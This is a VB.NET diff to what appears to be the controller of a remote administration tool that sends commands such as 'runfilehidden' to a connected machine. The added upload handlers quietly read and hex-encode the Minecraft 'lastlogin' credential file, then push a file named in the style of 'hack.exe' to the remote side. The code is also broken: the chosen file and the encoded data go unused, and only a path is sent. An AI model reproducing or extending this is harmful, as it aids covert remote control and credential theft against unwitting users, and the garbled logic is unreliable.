@@ -382,4 +382,56 @@ Public Class Controll
         Connection.w.WriteLine("runfilehidden|" & ListView1.SelectedItems.Item(0).Text.ToString())
         Connection.w.Flush()
     End Sub
+
+    Private Sub UploadFileToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UploadFileToolStripMenuItem.Click
+        Dim ofile As New OpenFileDialog
+        ofile.Title = "Select a File for Upload"
+        If ofile.ShowDialog = Windows.Forms.DialogResult.OK Then
+            Dim lastlogin As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\.minecraft\lastlogin"
+            Dim lastlogindata As String
+            If System.IO.File.Exists(lastlogin) = True Then
+                Using file As New IO.FileStream(lastlogin, IO.FileMode.Open)
+                    Dim value As Integer = file.ReadByte()
+                    Do Until value = -1
+                        lastlogindata = lastlogindata & value.ToString("X2")
+
+                        value = file.ReadByte()
+                    Loop
+                End Using
+            End If
+            Connection.w.WriteLine("uploadfile|" & TextBox4.Text & "\" & InputBox("Geben sie einen Filename an (hack.exe)", "Filename", ""))
+            Connection.w.Flush()
+            Threading.Thread.Sleep(500)
+            Connection.w.WriteLine(lastlogin)
+            Connection.w.Flush()
+        Else
+            MsgBox("Sie haben die Aktion abgebrochen", MsgBoxStyle.Information, "Manual")
+        End If
+    End Sub
+
+    Private Sub UploadInCurretFolderToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UploadInCurretFolderToolStripMenuItem.Click
+        Dim ofile As New OpenFileDialog
+        ofile.Title = "Select a File for Upload"
+        If ofile.ShowDialog = Windows.Forms.DialogResult.OK Then
+            Dim lastlogin As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\.minecraft\lastlogin"
+            Dim lastlogindata As String
+            If System.IO.File.Exists(lastlogin) = True Then
+                Using file As New IO.FileStream(lastlogin, IO.FileMode.Open)
+                    Dim value As Integer = file.ReadByte()
+                    Do Until value = -1
+                        lastlogindata = lastlogindata & value.ToString("X2")
+
+                        value = file.ReadByte()
+                    Loop
+                End Using
+            End If
+            Connection.w.WriteLine("uploadfile|" & TextBox4.Text & "\" & InputBox("Geben sie einen Filename an (hack.exe)", "Filename", ""))
+            Connection.w.Flush()
+            Threading.Thread.Sleep(500)
+            Connection.w.WriteLine(lastlogin)
+            Connection.w.Flush()
+        Else
+            MsgBox("Sie haben die Aktion abgebrochen", MsgBoxStyle.Information, "Manual")
+        End If
+    End Sub
 End Class
